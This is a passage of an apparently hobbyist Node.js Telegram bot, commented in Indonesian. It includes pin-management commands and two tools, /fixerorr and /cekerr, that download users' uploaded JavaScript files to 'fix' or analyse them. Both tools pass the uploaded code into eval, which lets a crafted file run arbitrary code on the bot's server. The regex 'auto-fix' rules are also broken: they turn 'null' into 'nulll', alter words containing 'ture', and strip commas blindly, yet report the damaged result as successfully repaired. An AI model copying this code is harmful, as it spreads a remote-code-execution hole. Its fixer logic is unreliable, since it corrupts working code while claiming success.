      parse_mode: 'Markdown'
    });
  }

  try {
    // Cek apakah pengirim adalah admin grup
    const admins = await bot.getChatAdministrators(chatId);
    const isAdmin = admins.some(admin => admin.user.id === senderId);
    
    if (!isAdmin) {
      return bot.sendPhoto(chatId, getRandomImage(), {
        caption: `❌ *Hanya admin yang bisa menggunakan perintah ini!*`,
        parse_mode: 'Markdown'
      });
    }

    await bot.unpinAllChatMessages(chatId);

    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name;
    bot.sendMessage(chatId,
      `✅ *Semua pesan sematan telah dilepas!*\n\n🗑️ Oleh: ${username}`,
      { parse_mode: 'Markdown' }
    );

  } catch (error) {
    console.error('UnpinAll Error:', error.message);
    bot.sendMessage(chatId,
      `❌ *Gagal melepas semua sematan!*\n\n⚠️ ${error.message}`,
      { parse_mode: 'Markdown' }
    );
  }
});

bot.onText(/\/pinned/, async (msg) => {
  const chatId = msg.chat.id;

  try {
    const chat = await bot.getChat(chatId);
    const pinnedMsg = chat.pinned_message;

    if (!pinnedMsg) {
      return bot.sendMessage(chatId,
        `📭 *Tidak ada pesan yang disematkan di grup ini.*`,
        { parse_mode: 'Markdown' }
      );
    }

    // Forward pesan yang disematkan
    await bot.forwardMessage(chatId, chatId, pinnedMsg.message_id);

    // Buat caption info
    let caption = `📌 *PESAN DISEMATKAN*\n━━━━━━━━━━━━━━━━━━━━━\n\n`;
    caption += `👤 *Pengirim:* ${pinnedMsg.from.first_name || ''} ${pinnedMsg.from.last_name || ''}`;
    if (pinnedMsg.from.username) caption += ` (@${pinnedMsg.from.username})`;
    caption += `\n🕒 *Tanggal:* ${new Date(pinnedMsg.date * 1000).toLocaleString('id-ID')}\n`;

    if (pinnedMsg.text) {
      caption += `\n💬 *Pesan:*\n${pinnedMsg.text.substring(0, 200)}`;
      if (pinnedMsg.text.length > 200) caption += '…';
    } else if (pinnedMsg.caption) {
      caption += `\n📎 *Keterangan media:*\n${pinnedMsg.caption.substring(0, 200)}`;
      if (pinnedMsg.caption.length > 200) caption += '…';
    } else {
      caption += `\n📎 *Jenis:* ${pinnedMsg.document ? 'Dokumen' : pinnedMsg.photo ? 'Foto' : pinnedMsg.video ? 'Video' : pinnedMsg.audio ? 'Audio' : 'Lainnya'}`;
    }

    caption += `\n\n━━━━━━━━━━━━━━━━━━━━━\n🔍 /pin – Sematkan pesan\n🔓 /unpin – Lepas sematan`;

    bot.sendMessage(chatId, caption, { parse_mode: 'Markdown' });

  } catch (error) {
    console.error('Pinned Error:', error.message);
    bot.sendMessage(chatId,
      `❌ *Gagal mengambil pesan sematan.*\n⚠️ ${error.message}`,
      { parse_mode: 'Markdown' }
    );
  }
});
bot.onText(/\/fixerorr/, async (msg) => {
  const chatId = msg.chat.id;
  const rep = msg.reply_to_message;

  // Validasi pesan balasan
  if (!rep?.document) {
    return bot.sendMessage(chatId, "❌ Reply file `.js` yang ingin diperbaiki");
  }

  // Validasi ekstensi file
  if (!rep.document.file_name.endsWith(".js")) {
    return bot.sendMessage(chatId, "❌ File harus berformat `.js`");
  }

  try {
    // Kirim status processing
    const processingMsg = await bot.sendMessage(chatId, "🔧 *Menganalisis dan memperbaiki file...*", {
      parse_mode: "Markdown"
    });

    // Download file
    const link = await bot.getFileLink(rep.document.file_id);
    const { data: code } = await axios.get(link);

    // Proses perbaikan otomatis
    const result = autoFixJS(code);

    // Hapus pesan processing
    bot.deleteMessage(chatId, processingMsg.message_id);

    // Jika tidak bisa diperbaiki
    if (!result.canFix && result.errors.length > 0) {
      const errorList = result.errors.map(e => `• ${e.message}`).join("\n");
      return bot.sendMessage(chatId, `
❌ *File tidak bisa diperbaiki otomatis!*

*Error yang ditemukan:*
${errorList}

${result.suggestions.length > 0 ? "*Saran:*\n" + result.suggestions.map(s => `• ${s}`).join("\n") : ""}

Silakan perbaiki manual.
      `.trim(), { parse_mode: "Markdown" });
    }

    // Simpan file hasil perbaikan
    const timestamp = Date.now();
    const originalName = rep.document.file_name.replace('.js', '');
    const outName = `${originalName}_fixed_${timestamp}.js`;
    
    fs.writeFileSync(outName, result.fixed);

    // Statistik file
    const fileSize = (fs.statSync(outName).size / 1024).toFixed(2);
    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User";
    
    // Buat caption laporan
    const caption = `
📄 *JS AUTO-FIX REPORT*  
━━━━━━━━━━━━━━━━━━━━━

📁 *File:* \`${outName}\`
📊 *Ukuran:* ${fileSize} KB
📈 *Baris:* ${result.stats.lines}
⚡ *Perubahan:* ${result.report.length}

👤 *User:* ${username}
⏱️ *Waktu:* ${new Date().toLocaleString('id-ID')}

━━━━━━━━━━━━━━━━━━━━━
🚀 *STATUS:* ${result.canFix ? "✅ BERHASIL DIPERBAIKI" : "⚠️ SEBAGIAN DIPERBAIKI"}

🔧 *PERBAIKAN YANG DILAKUKAN:*
${result.report.map((r, i) => `${i+1}. ${r}`).join("\n")}

${result.warnings.length > 0 ? `
⚠️ *PERINGATAN:*
${result.warnings.map((w, i) => `${i+1}. ${w}`).join("\n")}
` : ""}

${result.suggestions.length > 0 ? `
💡 *SARAN:*
${result.suggestions.map((s, i) => `${i+1}. ${s}`).join("\n")}
` : ""}

━━━━━━━━━━━━━━━━━━━━━
👑 *Fixed by: @VinxzGanteng*
    `;

    // Kirim file hasil perbaikan
    await bot.sendDocument(chatId, outName, {
      caption: caption.trim(),
      parse_mode: "Markdown"
    });

    // Hapus file sementara
    fs.unlinkSync(outName);

  } catch (error) {
    console.error("Error in /fixerorr:", error);
    bot.sendMessage(chatId, `❌ Terjadi kesalahan: ${error.message}`);
  }
});

// FUNGSI AUTO FIX JAVASCRIPT
function autoFixJS(code) {
  const report = [];
  const warnings = [];
  const suggestions = [];
  const errors = [];
  
  let fixedCode = code;
  let canFix = true;

  // ===========================================
  // 1. PERBAIKAN SYNTAX ERROR DASAR
  // ===========================================

  // 1.1 Perbaikan titik koma yang hilang
  try {
    const lines = fixedCode.split('\n');
    let fixedLines = [];
    
    for (let i = 0; i < lines.length; i++) {
      let line = lines[i];
      const trimmed = line.trim();
      
      // Skip jika baris kosong atau komentar
      if (!trimmed || trimmed.startsWith('//') || trimmed.startsWith('/*')) {
        fixedLines.push(line);
        continue;
      }
      
      // Tambah titik koma jika diperlukan
      if (!trimmed.endsWith(';') && 
          !trimmed.endsWith('{') && 
          !trimmed.endsWith('}') &&
          !trimmed.endsWith(':') &&
          !trimmed.endsWith(',') &&
          !trimmed.startsWith('if') &&
          !trimmed.startsWith('for') &&
          !trimmed.startsWith('while') &&
          !trimmed.startsWith('switch') &&
          !trimmed.startsWith('function') &&
          !trimmed.startsWith('class') &&
          !trimmed.startsWith('export') &&
          !trimmed.startsWith('import') &&
          !trimmed.includes('=>') &&
          !trimmed.match(/^[a-zA-Z_$][a-zA-Z0-9_$]*\s*\(/) &&
          !trimmed.match(/^(return|throw|break|continue|debugger|await|yield)/)) {
        
        line += ';';
        if (!report.includes("➕ Menambahkan titik koma yang hilang")) {
          report.push("➕ Menambahkan titik koma yang hilang");
        }
      }
      
      fixedLines.push(line);
    }
    
    fixedCode = fixedLines.join('\n');
  } catch (e) {
    errors.push("Gagal memperbaiki titik koma");
  }

  // 1.2 Perbaikan operator dengan spasi berlebih
  const operatorFixes = [
    { from: /= =/g, to: '==', msg: "🔧 Memperbaiki operator = = → ==" },
    { from: /= = =/g, to: '===', msg: "🔧 Memperbaiki operator = = = → ===" },
    { from: /! =/g, to: '!=', msg: "🔧 Memperbaiki operator ! = → !=" },
    { from: /! = =/g, to: '!==', msg: "🔧 Memperbaiki operator ! = = → !==" },
    { from: /< =/g, to: '<=', msg: "🔧 Memperbaiki operator < = → <=" },
    { from: /> =/g, to: '>=', msg: "🔧 Memperbaiki operator > = → >=" },
    { from: /= >/g, to: '=>', msg: "🔧 Memperbaiki arrow function = > → =>" },
    { from: /\+\s\+/g, to: '++', msg: "🔧 Memperbaiki increment + + → ++" },
    { from: /\-\s\-/g, to: '--', msg: "🔧 Memperbaiki decrement - - → --" },
    { from: /& &/g, to: '&&', msg: "🔧 Memperbaiki operator AND & & → &&" },
    { from: /\| \|/g, to: '||', msg: "🔧 Memperbaiki operator OR | | → ||" },
  ];

  operatorFixes.forEach(fix => {
    if (fixedCode.match(fix.from)) {
      fixedCode = fixedCode.replace(fix.from, fix.to);
      if (!report.includes(fix.msg)) {
        report.push(fix.msg);
      }
    }
  });

  // 1.3 Perbaikan string quote yang bermasalah
  fixedCode = fixedCode.replace(/(['"])(.*?)\1/g, (match, quote, content) => {
    // Deteksi quote di dalam string
    if (quote === "'" && content.includes("'") && !content.includes('"')) {
      const msg = "🔧 Mengubah single quote ke double quote untuk menghindari konflik";
      if (!report.includes(msg)) report.push(msg);
      return `"${content}"`;
    }
    if (quote === '"' && content.includes('"') && !content.includes("'")) {
      const msg = "🔧 Mengubah double quote ke single quote untuk menghindari konflik";
      if (!report.includes(msg)) report.push(msg);
      return `'${content}'`;
    }
    return match;
  });

  // 1.4 Perbaikan template literal yang rusak
  fixedCode = fixedCode.replace(/\${/g, '${');
  fixedCode = fixedCode.replace(/`([^`]*)\${([^}]+)}([^`]*)`/g, (match, p1, p2, p3) => {
    return `\`${p1}\${${p2.trim()}}${p3}\``;
  });

  // ===========================================
  // 2. PERBAIKAN VARIABEL DAN DEKLARASI
  // ===========================================

  // 2.1 Perbaikan variabel tanpa deklarasi
  const varPattern = /([a-zA-Z_$][a-zA-Z0-9_$]*)\s*=\s*([^;]+)/g;
  let match;
  while ((match = varPattern.exec(fixedCode)) !== null) {
    const varName = match[1];
    const varValue = match[2];
    
    // Cek apakah variabel sudah dideklarasikan
    const declarationCheck = new RegExp(`(var|let|const)\\s+${varName}\\s*=`, 'g');
    if (!fixedCode.match(declarationCheck) && 
        !varName.match(/^(console|window|document|Math|Date|Array|Object|String|Number)$/)) {
      
      // Cari baris deklarasi
      const lines = fixedCode.split('\n');
      let declarationIndex = -1;
      
      for (let i = 0; i < lines.length; i++) {
        if (lines[i].includes(varName) && 
            !lines[i].match(/(var|let|const)/) &&
            !lines[i].includes('//')) {
          declarationIndex = i;
          break;
        }
      }
      
      if (declarationIndex >= 0) {
        lines[declarationIndex] = `let ${lines[declarationIndex]}`;
        fixedCode = lines.join('\n');
        if (!report.includes("➕ Menambahkan deklarasi variabel dengan 'let'")) {
          report.push("➕ Menambahkan deklarasi variabel dengan 'let'");
        }
      }
    }
  }

  // 2.2 Perbaikan variabel undefined
  fixedCode = fixedCode.replace(/(let|const|var)\s+([a-zA-Z_$][a-zA-Z0-9_$]*)\s*;/g, (match, decl, varName) => {
    if (!match.includes('=')) {
      if (!report.includes(`➕ Menambahkan nilai default untuk ${varName}`)) {
        report.push(`➕ Menambahkan nilai default untuk ${varName}`);
      }
      return `${decl} ${varName} = null;`;
    }
    return match;
  });

  // 3.1 Perbaikan arrow function tanpa kurung
  fixedCode = fixedCode.replace(/([a-zA-Z_$][a-zA-Z0-9_$]*)\s*=>\s*{/g, (match, param) => {
    if (!param.includes('(') && !param.includes(')')) {
      if (!report.includes("🔧 Menambahkan kurung pada parameter arrow function")) {
        report.push("🔧 Menambahkan kurung pada parameter arrow function");
      }
      return `(${param}) => {`;
    }
    return match;
  });

  // 3.2 Perbaikan arrow function dengan return implisit
  fixedCode = fixedCode.replace(/\(([^)]+)\)\s*=>\s*([^{;][^;]+)/g, (match, params, body) => {
    if (!body.includes('return') && !body.includes('{')) {
      if (!report.includes("🔧 Mengubah arrow function ke return implisit")) {
        report.push("🔧 Mengubah arrow function ke return implisit");
      }
      return `(${params}) => (${body})`;
    }
    return match;
  });

  // 3.3 Perbaikan fungsi tanpa kurung buka
  fixedCode = fixedCode.replace(/function\s+([a-zA-Z_$][a-zA-Z0-9_$]*)\s*\(([^)]*)\)\s*/g, (match, name, params) => {
    return `function ${name}(${params.trim()}) `;
  });


  // 4.1 Perbaikan require tanpa kurung
  fixedCode = fixedCode.replace(/require\s+([a-zA-Z_$][a-zA-Z0-9_$]*)/g, (match, module) => {
    if (!report.includes("🔧 Memperbaiki format require()")) {
      report.push("🔧 Memperbaiki format require()");
    }
    return `require('${module}')`;
  });

  fixedCode = fixedCode.replace(/require\s*\(\s*([^'"][^)]+)\s*\)/g, (match, module) => {
    return `require('${module.trim()}')`;
  });

  // 4.2 Perbaikan module.exports
  fixedCode = fixedCode.replace(/module\s*\.\s*exports\s*=/g, 'module.exports =');
  fixedCode = fixedCode.replace(/exports\s*\.\s*([a-zA-Z_$][a-zA-Z0-9_$]*)\s*=/g, (match, name) => {
    return `exports.${name} =`;
  });

  // ===========================================
  // 5. PERBAIKAN OBJECT DAN ARRAY
  // ===========================================

  // 5.1 Perbaikan object property tanpa value
  fixedCode = fixedCode.replace(/([{,]\s*)([a-zA-Z_$][a-zA-Z0-9_$]*)\s*([,}])/g, (match, prefix, prop, suffix) => {
    if (!match.includes(':')) {
      if (!report.includes("🔧 Memperbaiki shorthand property object")) {
        report.push("🔧 Memperbaiki shorthand property object");
      }
      return `${prefix}${prop}: ${prop}${suffix}`;
    }
    return match;
  });

  // 5.2 Perbaikan trailing comma di object
  fixedCode = fixedCode.replace(/,\s*}/g, ' }');
  fixedCode = fixedCode.replace(/,\s*]/g, ' ]');

  // ===========================================
  // 6. PERBAIKAN CONTROL FLOW
  // ===========================================

  // 6.1 Perbaikan if statement tanpa kurung kurawal
  fixedCode = fixedCode.replace(/if\s*\(([^)]+)\)\s*([^{;][^;]+);/g, (match, condition, body) => {
    if (!report.includes("🔧 Menambahkan kurung kurawal pada if statement")) {
      report.push("🔧 Menambahkan kurung kurawal pada if statement");
    }
    return `if (${condition}) {\n  ${body.trim()};\n}`;
  });

  // 6.2 Perbaikan for loop
  fixedCode = fixedCode.replace(/for\s*\(\s*([^;]+);\s*([^;]+);\s*([^)]+)\)\s*([^{][^;]+);/g, 
    (match, init, cond, inc, body) => {
    return `for (${init.trim()}; ${cond.trim()}; ${inc.trim()}) {\n  ${body.trim()};\n}`;
  });

  // ===========================================
  // 7. PERBAIKAN COMMON TYPO
  //===========================================

  const typoFixes = [
    { from: /consol\.log/g, to: 'console.log', msg: "🔧 Memperbaiki typo consol.log → console.log" },
    { from: /consoel\.log/g, to: 'console.log', msg: "🔧 Memperbaiki typo consoel.log → console.log" },
    { from: /consle\.log/g, to: 'console.log', msg: "🔧 Memperbaiki typo consle.log → console.log" },
    { from: /console\.long/g, to: 'console.log', msg: "🔧 Memperbaiki typo console.long → console.log" },
    { from: /console\.lag/g, to: 'console.log', msg: "🔧 Memperbaiki typo console.lag → console.log" },
    { from: /lenght/g, to: 'length', msg: "🔧 Memperbaiki typo lenght → length" },
    { from: /lenth/g, to: 'length', msg: "🔧 Memperbaiki typo lenth → length" },
    { from: /undefiend/g, to: 'undefined', msg: "🔧 Memperbaiki typo undefiend → undefined" },
    { from: /undefind/g, to: 'undefined', msg: "🔧 Memperbaiki typo undefind → undefined" },
    { from: /ture/g, to: 'true', msg: "🔧 Memperbaiki typo ture → true" },
    { from: /flase/g, to: 'false', msg: "🔧 Memperbaiki typo flase → false" },
    { from: /nul/g, to: 'null', msg: "🔧 Memperbaiki typo nul → null" },
    { from: /Nan/g, to: 'NaN', msg: "🔧 Memperbaiki typo Nan → NaN" },
  ];

  typoFixes.forEach(fix => {
    if (fixedCode.match(fix.from)) {
      fixedCode = fixedCode.replace(fix.from, fix.to);
      if (!report.includes(fix.msg)) {
        report.push(fix.msg);
      }
    }
  });

  // ===========================================
  // 8. PERBAIKAN WHITESPACE DAN FORMATTING
  // ===========================================

  // 8.1 Hapus multiple blank lines
  fixedCode = fixedCode.replace(/\n\s*\n\s*\n/g, '\n\n');
  
  // 8.2 Tambah newline di akhir file
  if (!fixedCode.endsWith('\n')) {
    fixedCode += '\n';
  }

  // 8.3 Hapus spasi berlebih di akhir baris
  fixedCode = fixedCode.replace(/[ \t]+$/gm, '');

  // 8.4 Normalisasi indentasi (2 spasi)
  const lines = fixedCode.split('\n');
  let indentLevel = 0;
  let formattedLines = [];
  
  lines.forEach(line => {
    const trimmed = line.trim();
    
    if (trimmed.startsWith('}') || trimmed.startsWith(']') || trimmed.startsWith(')')) {
      indentLevel = Math.max(0, indentLevel - 1);
    }
    
    const indent = '  '.repeat(indentLevel);
    formattedLines.push(indent + trimmed);
    
    if (trimmed.endsWith('{') || trimmed.endsWith('[') || trimmed.endsWith('(')) {
      indentLevel++;
    }
  });
  
  fixedCode = formattedLines.join('\n');

  // ===========================================
  // 9. GENERATE WARNINGS DAN SUGGESTIONS
  //===========================================

  // 9.1 Warning untuk console.log
  if (fixedCode.includes('console.log') && !code.includes('console.log')) {
    warnings.push("File mengandung console.log yang ditambahkan");
  }

  // 9.2 Warning untuk variabel global
  if (fixedCode.match(/[a-zA-Z_$][a-zA-Z0-9_$]*\s*=\s*[^;]+/g)) {
    warnings.push("Terdapat variabel global, pertimbangkan menggunakan let/const");
  }

  // 9.3 Saran untuk ES6+
  if (fixedCode.includes('var ')) {
    suggestions.push("Pertimbangkan mengganti 'var' dengan 'let' atau 'const'");
  }

  if (fixedCode.includes('function(') && fixedCode.includes('function (')) {
    suggestions.push("Pertimbangkan menggunakan arrow function untuk callback");
  }

  // 9.4 Saran untuk strict mode
  if (!fixedCode.includes('use strict')) {
    suggestions.push("Tambahkan 'use strict' di awal file untuk keamanan");
  }

  // ===========================================
  // 10. VALIDASI HASIL PERBAIKAN
  // ===========================================

  try {
    // Cek apakah kode bisa di-eval
    eval(`(function() { ${fixedCode} })`);
  } catch (error) {
    errors.push(error.message.split('\n')[0]);
    canFix = false;
  }

  // Cek apakah ada perubahan signifikan
  const isChanged = fixedCode !== code;
  const fixCount = report.length;

  // Hapus duplikat report
  const uniqueReport = [...new Set(report)];
  const uniqueWarnings = [...new Set(warnings)];
  const uniqueSuggestions = [...new Set(suggestions)];

  return {
    original: code,
    fixed: fixedCode,
    report: uniqueReport,
    warnings: uniqueWarnings,
    suggestions: uniqueSuggestions,
    errors: errors,
    canFix: canFix && isChanged && fixCount > 0,
    stats: {
      lines: fixedCode.split('\n').length,
      characters: fixedCode.length,
      fixesApplied: uniqueReport.length,
      warningsCount: uniqueWarnings.length,
      suggestionsCount: uniqueSuggestions.length,
      errorsCount: errors.length
    }
  };
}
bot.onText(/\/cekerr/, async (msg) => {
  const chatId = msg.chat.id;
  const rep = msg.reply_to_message;

  // Validasi pesan balasan
  if (!rep?.document) {
    return bot.sendMessage(chatId, "❌ Silakan reply file `.js` yang ingin dicek errornya");
  }

  // Validasi ekstensi file
  if (!rep.document.file_name.endsWith(".js")) {
    return bot.sendMessage(chatId, "❌ File harus berformat `.js`");
  }

  try {
    // Kirim status sedang diproses
    const processingMsg = await bot.sendMessage(chatId, "⏳ Mengunduh dan menganalisis file...");

    // Download file
    const link = await bot.getFileLink(rep.document.file_id);
    const { data: code } = await axios.get(link);
    
    // Simpan file sementara
    const tempFileName = `temp_${Date.now()}.js`;
    fs.writeFileSync(tempFileName, code);

    // Analisis kode JavaScript
    const analysisResult = analyzeJavaScript(code, tempFileName);

    // Hapus file sementara
    fs.unlinkSync(tempFileName);

    // Hapus pesan processing
    bot.deleteMessage(chatId, processingMsg.message_id);

    // Format dan kirim hasil analisis
    const formattedReport = formatAnalysisReport(analysisResult, rep.document.file_name);
    
    await bot.sendMessage(chatId, formattedReport, {
      parse_mode: "HTML",
      disable_web_page_preview: true
    });

  } catch (error) {
    console.error("Error in /cekerr:", error);
    bot.sendMessage(chatId, `❌ Gagal menganalisis file: ${error.message}`);
  }
});

// Fungsi utama untuk menganalisis JavaScript
function analyzeJavaScript(code, filename) {
  const result = {
    filename: filename,
    totalLines: code.split('\n').length,
    fileSize: Buffer.byteLength(code, 'utf8'),
    issues: [],
    warnings: [],
    suggestions: [],
    hasErrors: false,
    score: 100 // Skor awal
  };

  const lines = code.split('\n');

  // 1. Cek syntax error menggunakan Node.js
  try {
    // Coba evaluasi kode
    eval(`(function() { ${code} })`);
  } catch (error) {
    result.hasErrors = true;
    result.score -= 30;
    
    // Parse error message untuk info lebih detail
    const errorLine = extractErrorLine(error.message, lines);
    result.issues.push({
      type: "ERROR",
      message: error.message.split('\n')[0],
      line: errorLine,
      severity: "HIGH"
    });
  }

  // 2. Analisis statis
  lines.forEach((line, index) => {
    const lineNum = index + 1;
    const trimmedLine = line.trim();

    // Skip baris kosong dan komentar
    if (!trimmedLine || trimmedLine.startsWith('//') || trimmedLine.startsWith('/*')) {
      return;
    }

    // A. Cek titik koma yang hilang
    if (trimmedLine && 
        !trimmedLine.endsWith(';') && 
        !trimmedLine.endsWith('{') && 
        !trimmedLine.endsWith('}') &&
        !trimmedLine.startsWith('if') &&
        !trimmedLine.startsWith('for') &&
        !trimmedLine.startsWith('while') &&
        !trimmedLine.startsWith('function') &&
        !trimmedLine.startsWith('class') &&
        !trimmedLine.startsWith('export') &&
        !trimmedLine.startsWith('import') &&
        !trimmedLine.includes('=>') &&
        !trimmedLine.match(/^[a-zA-Z_$][a-zA-Z0-9_$]*\s*\(/)) {
      
      result.warnings.push({
        type: "WARNING",
        message: "Titik koma mungkin hilang",
        line: lineNum,
        code: trimmedLine.substring(0, 50)
      });
      result.score -= 0.5;
    }

    // B. Cek variabel yang dideklarasikan tapi tidak digunakan
    const varMatch = line.match(/(var|let|const)\s+([a-zA-Z_$][a-zA-Z0-9_$]*)/g);
    if (varMatch) {
      varMatch.forEach(variable => {
        const varName = variable.split(/\s+/)[1];
        // Cek apakah variabel digunakan setelah deklarasi
        const isUsed = code.indexOf(varName, index * line.length) > index * line.length;
        if (!isUsed) {
          result.warnings.push({
            type: "WARNING",
            message: `Variabel '${varName}' dideklarasikan tapi mungkin tidak digunakan`,
            line: lineNum,
            code: trimmedLine.substring(0, 50)
          });
          result.score -= 1;
        }
      });
    }

    // C. Cek console.log yang ditinggalkan (untuk production)
    if (line.includes('console.log') && !line.includes('//')) {
      result.suggestions.push({
        type: "SUGGESTION",
        message: "Pertimbangkan menghapus console.log untuk production",
        line: lineNum,
        code: trimmedLine.substring(0, 50)
      });
      result.score -= 0.2;
    }

    // D. Cek string quote yang tidak konsisten
    const singleQuotes = (line.match(/'/g) || []).length;
    const doubleQuotes = (line.match(/"/g) || []).length;
    if (singleQuotes > 0 && doubleQuotes > 0) {
      result.suggestions.push({
        type: "SUGGESTION",
        message: "Pertimbangkan menggunakan satu jenis quote secara konsisten",
        line: lineNum,
        code: trimmedLine.substring(0, 50)
      });
    }

    // E. Cek operator dengan spasi aneh
    const weirdOperators = line.match(/(=\s*=|\!\s*=|<\s*=|>\s*=|\+\s*\+|\-\s*-)/g);
    if (weirdOperators) {
      result.issues.push({
        type: "ISSUE",
        message: `Operator dengan spasi tidak biasa: ${weirdOperators[0]}`,
        line: lineNum,
        severity: "MEDIUM",
        code: trimmedLine.substring(0, 50)
      });
      result.score -= 2;
    }

    // F. Cek panjang baris (jika terlalu panjang)
    if (line.length > 100) {
      result.suggestions.push({
        type: "SUGGESTION",
        message: "Baris terlalu panjang (pertimbangkan untuk dipecah)",
        line: lineNum,
        code: trimmedLine.substring(0, 30) + "..."
      });
    }
  });

  // 3. Cek require/module yang tidak ada
  const requireMatches = code.match(/require\(['"]([^'"]+)['"]\)/g) || [];
  requireMatches.forEach(req => {
    const moduleName = req.match(/require\(['"]([^'"]+)['"]\)/)[1];
    if (!moduleName.startsWith('./') && !moduleName.startsWith('../') && 
        !moduleName.startsWith('/') && !isBuiltinModule(moduleName)) {
      result.warnings.push({
        type: "WARNING",
        message: `Module '${moduleName}' mungkin perlu diinstall`,
        line: null,
        code: req
      });
    }
  });

  // 4. Cek fungsi yang tidak dipanggil
  const functionMatches = code.match(/function\s+([a-zA-Z_$][a-zA-Z0-9_$]*)\s*\(/g) || [];
  functionMatches.forEach(func => {
    const funcName = func.match(/function\s+([a-zA-Z_$][a-zA-Z0-9_$]*)\s*\(/)[1];
    const callCount = (code.match(new RegExp(`\\b${funcName}\\(`, 'g')) || []).length;
    if (callCount <= 1) { // Hanya deklarasi, tidak ada pemanggilan
      result.suggestions.push({
        type: "SUGGESTION",
        message: `Fungsi '${funcName}' dideklarasikan tapi mungkin tidak pernah dipanggil`,
        line: null
      });
    }
  });

  // 5. Hitung metrik
  const totalIssues = result.issues.length + result.warnings.length + result.suggestions.length;
  
  // Pastikan skor tidak negatif
  result.score = Math.max(0, result.score);
  result.score = Math.min(100, result.score);

  // Tambahkan summary
  result.summary = {
    totalIssues,
    errorCount: result.issues.filter(i => i.type === "ERROR").length,
    warningCount: result.warnings.length,
    suggestionCount: result.suggestions.length,
    complexity: calculateComplexity(code)
  };

  return result;
}

// Fungsi helper untuk ekstrak line dari error message
function extractErrorLine(errorMsg, lines) {
  const match = errorMsg.match(/at (\d+):(\d+)/);
  if (match) {
    return parseInt(match[1]);
  }
  
  // Coba cara lain
  for (let i = 0; i < lines.length; i++) {
    if (errorMsg.includes(lines[i].substring(0, 30))) {
      return i + 1;
    }
  }
  
  return null;
}

// Cek apakah module built-in Node.js
function isBuiltinModule(moduleName) {
  const builtins = [
    'fs', 'path', 'http', 'https', 'url', 'util', 'stream', 'buffer',
    'events', 'crypto', 'os', 'child_process', 'cluster', 'dgram',
    'dns', 'domain', 'net', 'readline', 'repl', 'tls', 'tty', 'vm',
    'zlib', 'assert', 'console', 'module', 'process', 'querystring',
    'string_decoder', 'timers', 'v8'
  ];
  return builtins.includes(moduleName.split('/')[0]);
}

// Hitung kompleksitas sederhana
function calculateComplexity(code) {
  let complexity = 1;
  
  // Tambah berdasarkan kontrol flow
  complexity += (code.match(/if\s*\(/g) || []).length;
  complexity += (code.match(/for\s*\(/g) || []).length;
  complexity += (code.match(/while\s*\(/g) || []).length;
  complexity += (code.match(/catch\s*\(/g) || []).length;
  complexity += (code.match(/\?/g) || []).length / 2;
  
  // Kurangi poin untuk fungsi sederhana
  const functions = (code.match(/function\s+\w+\s*\(/g) || []).length +
                   (code.match(/=>/g) || []).length;
  complexity += functions;
  
  if (complexity < 5) return "RENDAH";
  if (complexity < 15) return "SEDANG";
  return "TINGGI";
}

// Format laporan menjadi HTML yang rapih
function formatAnalysisReport(result, originalFilename) {
  let report = `<b>📊 LAPORAN ANALISIS KODE JAVASCRIPT</b>\n\n`;
  
  report += `<b>📁 File:</b> <code>${originalFilename}</code>\n`;
  report += `<b>📈 Total Baris:</b> ${result.totalLines}\n`;
  report += `<b>💾 Ukuran:</b> ${(result.fileSize / 1024).toFixed(2)} KB\n`;
  report += `<b>⚡ Kompleksitas:</b> ${result.summary.complexity}\n`;
  report += `<b>🏆 Skor Kesehatan:</b> <b>${result.score.toFixed(1)}/100</b>\n\n`;
  
  // Progress bar untuk skor
  const progressBar = getProgressBar(result.score);
  report += `${progressBar}\n\n`;
  
  // Tampilkan issues/errors
  if (result.issues.length > 0) {
    report += `<b>🔴 ERROR & ISSUE (${result.issues.length})</b>\n`;
    result.issues.forEach((issue, idx) => {
      report += `<b>${idx + 1}.</b> <code>[Line ${issue.line || 'N/A'}]</code>\n`;
      report += `   ${issue.message}\n`;
      if (issue.code) {
        report += `   <code>${escapeHtml(issue.code)}</code>\n`;
      }
      report += `   <i>Severity: ${issue.severity}</i>\n\n`;
    });
  }
  
  // Tampilkan warnings
  if (result.warnings.length > 0) {
    report += `<b>🟡 PERINGATAN (${result.warnings.length})</b>\n`;
    result.warnings.slice(0, 5).forEach((warning, idx) => {
      report += `<b>${idx + 1}.</b> <code>[Line ${warning.line || 'N/A'}]</code>\n`;
      report += `   ${warning.message}\n`;
      if (warning.code) {
        report += `   <code>${escapeHtml(warning.code)}</code>\n`;
      }
      report += `\n`;
    });
    if (result.warnings.length > 5) {
      report += `   ... dan ${result.warnings.length - 5} warning lainnya\n\n`;
    }
  }
  
  // Tampilkan suggestions
  if (result.suggestions.length > 0) {
    report += `<b>🔵 SUGGESTI (${result.suggestions.length})</b>\n`;
    result.suggestions.slice(0, 3).forEach((suggestion, idx) => {
      report += `<b>${idx + 1}.</b> <code>[Line ${suggestion.line || 'N/A'}]</code>\n`;
      report += `   ${suggestion.message}\n`;
      if (suggestion.code) {
        report += `   <code>${escapeHtml(suggestion.code)}</code>\n`;
      }
      report += `\n`;
    });
    if (result.suggestions.length > 3) {
      report += `   ... dan ${result.suggestions.length - 3} saran lainnya\n\n`;
    }
  }
  
  // Rekomendasi berdasarkan skor
  report += `<b>📋 REKOMENDASI</b>\n`;
  if (result.score >= 90) {
    report += `✅ Kode dalam kondisi sangat baik!\n`;
  } else if (result.score >= 70) {
    report += `⚠️ Kode cukup baik, perbaikan minor diperlukan\n`;
  } else if (result.score >= 50) {
    report += `🔧 Kode perlu perbaikan signifikan\n`;
  } else {
    report += `🚨 Kode memerlukan refactor besar\n`;
  }
  
  if (result.issues.length > 0) {
    report += `\nGunakan <code>/fixerorr</code> untuk mencoba perbaikan otomatis!\n`;
  }
  
  report += `\n<code>👑 Tools by @VinxzGanteng</code>`;
  
  return report;
}

// Fungsi helper: buat progress bar
function getProgressBar(score) {
  const filled = Math.round(score / 10);
  const empty = 10 - filled;
  
  let bar = '';
  for (let i = 0; i < filled; i++) bar += '█';
  for (let i = 0; i < empty; i++) bar += '░';
  
  return bar;
}

// Fungsi helper: escape HTML
function escapeHtml(text) {
  return text
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}
// ===========================================
// 🔍 CEK CHANNEL TELEGRAM
// ===========================================
// Digunakan untuk mendapatkan informasi channel Telegram
// Support: reply ke pesan channel, username (@channel), link (t.me/...), ID numerik
// ===========================================

bot.onText(/\/cekch(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
